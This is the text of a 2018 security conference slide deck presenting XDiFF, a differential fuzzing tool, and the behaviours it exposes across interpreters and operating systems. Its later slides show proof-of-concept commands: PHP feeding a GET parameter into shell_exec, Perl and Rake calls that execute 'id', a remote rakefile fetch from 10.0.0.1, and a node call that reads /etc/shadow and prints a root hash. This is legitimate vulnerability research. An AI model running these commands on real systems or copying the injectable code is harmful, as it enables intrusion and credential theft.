Exposing Hidden Exploitable Behaviors Using Extended Differential Fuzzing
Fernando Arnaboldi Senior Security Consultant
Amsterdam - April 13th, 2018
IOActive, Inc. Copyright ©2018. All Rights Reserved.

Agenda
· 1. What, Who, How & Why · 2. Common Fuzzing · 3. Differential Fuzzing · 4. Extended Differential Fuzzing
IOActive, Inc. Copyright ©2018. All Rights Reserved.

1.1. What Do You Expect From Fuzzing?
· Fuzzing exposes undisclosed functionalities or unexpected behaviors.
· Extended differential fuzzing can expose more stuff
IOActive, Inc. Copyright ©2018. All Rights Reserved.

1.2. Who Cares About Fuzzing?
· Security Consultants · Software Testers · Software Developers
IOActive, Inc. Copyright ©2018. All Rights Reserved.

1.3. How
· Manually or
· Using an extended differential fuzzing framework (XDiFF)
­ Open source Python project ­ Multiplatform (FreeBSD, Linux, OSX,
Windows) ­ Gathers all the information ­ Exposes the unexpected behaviors
IOActive, Inc. Copyright ©2018. All Rights Reserved.

1.3. How: Fuzzing Process
Input Generation

Software Execution

IOActive, Inc. Copyright ©2018. All Rights Reserved.

Output Analysis

1.3. How: The Input
IOActive, Inc. Copyright ©2018. All Rights Reserved.

1.3. How: The Software
IOActive, Inc. Copyright ©2018. All Rights Reserved.

1.4. Why? To automatize the output analysis
IOActive, Inc. Copyright ©2018. All Rights Reserved.

0.1 + 0.2 - 0.3 = 0? Nah
IOActive, Inc. Copyright ©2018. All Rights Reserved.

9007199254740992 + 1 = 9007199254740992
IOActive, Inc. Copyright ©2018. All Rights Reserved.

2. Common Fuzzing
IOActive, Inc. Copyright ©2018. All Rights Reserved.

2. What to Detect:
· Crashes · Hangs
IOActive, Inc. Copyright ©2018. All Rights Reserved.

2. Common Fuzzing: Crashes
IOActive, Inc. Copyright ©2018. All Rights Reserved.

2. Crashes: XDiFF Output ­ Valgrind
IOActive, Inc. Copyright ©2018. All Rights Reserved.

2. Crashes: XDiFF Output ­ Return Codes
IOActive, Inc. Copyright ©2018. All Rights Reserved.

2. Crashes

Perl HHVM
Ruby Pypy

ChakraCore

IOActive, Inc. Copyright ©2018. All Rights Reserved.

2. Crashes: XDiFF Output ­ Hangs
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3. Differential Fuzzing
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3. What is Differential Fuzzing?
· "Execute one or more similar implementations to compare and analize their outputs"
· What do we mean by output? ­ The standard output ­ The standard error ­ The network connections ­ The return code ­ The time required for the execution ­ If the software was killed or not
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3. What to Execute
· 3.1. Different implementations
· 3.2. Different inputs:
­ CLI ­ File ­ URL ­ Standard Input
· 3.3. Different versions
· 3.4. Different operating systems
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.1. Different Implementations
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.1. Different Implementations: Stdout

V8 (CLI) $ d8 -e 'print(this)' [object.global]

SpiderMonkey (CLI) $ js -e 'print(this)' [object.global]

IOActive, Inc. Copyright ©2018. All Rights Reserved.

NodeJS v7.2.1 (CLI) $ node -e 'console.log(this)' {
[...SNIP...] USER: 'testuser', PATH: '/opt/local/bin:...', PWD: '/Users/testuser, HOME: '/Users/testuser', pid: 60094, [...SNIP...]

3.1. Different Implementations: Killed or Stderr

OpenJDK 8 Killed No

Oracle 9 Yes

Stderr

Exception in thread "main" java.lang.OutOfMemoryError: Java heap space at sun.security.provider.NativePRNG$RandomIO.implGenerateSeed(NativePRNG.java:440) [...]

IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.2. Different Inputs
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.2. Different Inputs: Stdout

NodeJS v7.2.1 (File) $ echo "console.log(this)" > file.js ; node file.js {}

NodeJS v7.2.1 (CLI) $ node -e 'console.log(this)' {
[...SNIP...] USER: 'testuser', PATH: '/opt/local/bin:...', PWD: '/Users/testuser, HOME: '/Users/testuser', pid: 60094, [...SNIP...]

IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.2. Different Inputs: Stdout

Windows 10 Powershell (File)

Windows 10 Powershell (CLI)

C:\>echo Invoke-Expression dir > test.ps1 C:\>powershell "& ""c:\test.ps1""" & : File C:\test.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.

At line:1 char:3

+ & "c:\test.ps1"

+ ~~~~~~~~~~~~~

+ CategoryInfo

: SecurityError:

(:) [], PSSecurityException

+ FullyQualifiedErrorId :

UnauthorizedAccess

C:\>powershell -Command Invoke-Expression dir

Directory: C:\

Mode ----

LastWriteTime Length Name ------------- ------ ----

d----- 12/13/2017 5:41 PM

PerfLogs

d-r--- 3/2/2018 8:45 AM

Program Files

d-r--- 3/1/2018 12:16 PM

Program Files(x86)

d-r--- 3/1/2018 12:20 PM

Users

d----- 3/6/2018 3:15 AM

Windows

-a---- 3/28/2018 10:34 AM

24 test.ps1

IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.3. Different Versions
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.3. Different Versions: Stdout

NodeJS v0.4.0 (CLI) $ node -e `console.log(this)' {}
IOActive, Inc. Copyright ©2018. All Rights Reserved.

NodeJS v7.2.1 (CLI) $ node -e 'console.log(this)' {
[...SNIP...] USER: 'testuser', PATH: '/opt/local/bin:...', PWD: '/Users/testuser, HOME: '/Users/testuser', pid: 60094, [...SNIP...]

3.3. Different Versions: Return Code or Stderr

OpenJDK 8 Return Code 0

Oracle 9 1

Warning: SecureRandom is internal
Stderr proprietary API and may be removed in a
future release

Package sun.security.provider is not visible

IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.4. Different Operating Systems
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.4. Different OS: Stdout
· In Python 2.7 the built-in functionality cmp() compares two objects:
· The following compares two floating point "not a number" values:
print(cmp(float('nan'),float('nan')))
IOActive, Inc. Copyright ©2018. All Rights Reserved.

3.4. Different OS: Stdout (cont).

Software CPython
PyPy
Jython
IOActive, Inc. Copyright ©2018. All Rights Reserved.

OS Linux Freebsd OS X Windows Linux Freebsd OS X Windows Linux Freebsd OS X Windows

Stdout -1 1 1 1 0 0 0 0 1 1 1 1

3.4. Different OS: Stdout

Windows 10 Powershell (File)

C:\>echo Invoke-Expression dir > test.ps1 C:\>powershell "& ""c:\test.ps1""" & : File C:\test.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.

At line:1 char:3

+ & "c:\test.ps1"

+ ~~~~~~~~~~~~~

+ CategoryInfo

: SecurityError: (:) [],

PSSecurityException

+ FullyQualifiedErrorId : UnauthorizedAccess

Linux Powershell (File)
# echo Invoke-Expression dir > test.ps1 # pwsh test.ps1

Directory: /

Mode ---d----d----d----d----d----[...]

LastWriteTime ------------3/13/18 6:07 AM 3/3/18 3:23 PM 3/16/18 5:45 PM 4/5/18 9:13 AM 3/12/18 4:33 PM

Length Name ------ ----
bin boot dev etc home

IOActive, Inc. Copyright ©2018. All Rights Reserved.

4. Extended Differential Fuzzing
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4. What to Detect:
· Path Disclosure · User Disclosure · Error Disclosure · Code Evaluated · Command Executed · Network Connections · File Read
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.1. How Files are Deleted in Linux/OSX
server:tmp $ rm non-existing-file rm: non-existing-file: No such file or directory server:tmp $ touch existing-file server:tmp $ rm -i existing-file remove existing-file?
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.1. Path Disclosure: XDiFF Output
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.1. Path Disclosure: Powershell

C:\Users>powershell -Command Clear-Content -Confirm non-existing-file

Clear-Content : Cannot find path 'C:\Users\non-existing-file' because it does not exist.

At line:1 char:1

+ Clear-Content -Confirm non-existing-file

+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+ CategoryInfo

: ObjectNotFound: (C:\Users\non-existing-

file:String) [Clear-Content], ItemNotFoundExcepti

on

+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.ClearContentCommand

IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.1. Path Disclosure: Powershell (cont'd)

C:\Users>echo blah > existing-file

C:\Users>powershell -Command Clear-Content -Confirm existing-file

Confirm Are you sure you want to perform this action? Performing the operation "Clear Content" on target "Item: C:\Users\existing-file". [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend (default is "Y"):

[?] Help

IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.2. User Disclosure: XDiFF Output
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.2. User Disclosure
C:\>powershell -Command Start-Transcript Transcript started, output file is C:\Users\Administrator\Documents\PowerShell_transcript.DESKTOPQIJDN98.xoUGhDVe.20180328104416.txt
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.3. Error Disclosure: XDiFF Output
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.4. Code Evaluated: XDiFF Output
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.4. Code Evaluated: Perl
# perl -e "use ExtUtils::Typemaps::Cmd;print embeddable_typemap(\"system 'id'\")" String found where operator expected at (eval 1) line 1, near "require ExtUtils::Typemaps::system 'id'"
(Do you need to predeclare require?) uid=0(root) gid=0(root) groups=0(root) Unable to find typemap for 'system 'id'': Tried to load both as file or module and failed.
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.5. Command Execution: XDiFF Output
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.5. Command Execution: PHP 1/3
· Let's define the a bash constant on index.php:
<?php define("bash","man "); require_once("functions.php"); ?>
· The previous file requires functions.php and shows a man page:
<?php $output = shell_exec(bash.$_GET['page']); print "<pre>".$output."</pre>"; ?>
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.5. Command Execution: PHP 2/3
· The command "man " is executed when index.php is called:
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.5. Command Execution: PHP 3/3
· The command "bash" is executed when functions.php is called:
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.6. Network Connection: XDiFF Output
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.6. Network Connection: JRuby RCE

# curl http://10.0.0.1/canaryfile puts %x(id)

Ruby v2.3.1 # ruby -e 'require "rake";puts Rake.load_rakefile("http://10.0.0.1/canar yfile")'

JRuby v1.7.22 # jruby -e 'require "rake";puts Rake.load_rakefile("http://10.0.0.1/canar yfile")'

/usr/lib/ruby/vendor_ruby/rake/rake_mod uid=0(root) gid=0(root) groups=0(root) ule.rb:28:in `load': cannot load such file --

[...SNIP...]

IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.7. File Read: XDiFF Output
IOActive, Inc. Copyright ©2018. All Rights Reserved.

4.7. File Read: Leak Root's Password

NodeJS with Chakracore

NodeJS v4.2.6 with V8

# node -e "console.log(require('/etc/shadow))" # node -e "console.log(require('/etc/shadow'))"

SyntaxError: Invalid character

/etc/shadow:1

[...SNIP...]

(function (exports, require, module, __filename, __dirname) { root:$6$AP53wsfZ$XdxiQRFJF6PzdRd3SxD eIwKsmyEkWgNOSSg.WZR18KfLo617cR1Z swMZEPT5QTS95aH.NI2DrqmQ8rMbm8sIq/: 17172:0:14600:14::: ^

SyntaxError: Unexpected token :

IOActive, Inc. Copyright ©2018. All Rights Reserved.

XDiFF Conclusions
· Analyze different vulnerabilities · Expose more vulnerabilities by differential analysis · One payload could be used affect multiple pieces of
software
IOActive, Inc. Copyright ©2018. All Rights Reserved.

Questions?
IOActive, Inc. Copyright ©2018 All Rights Reserved.

Thank You
Get your Hack In The Box release from:
https://github.com/IOActive/XDiFF/releases
IOActive, Inc. Copyright ©2018 All Rights Reserved.

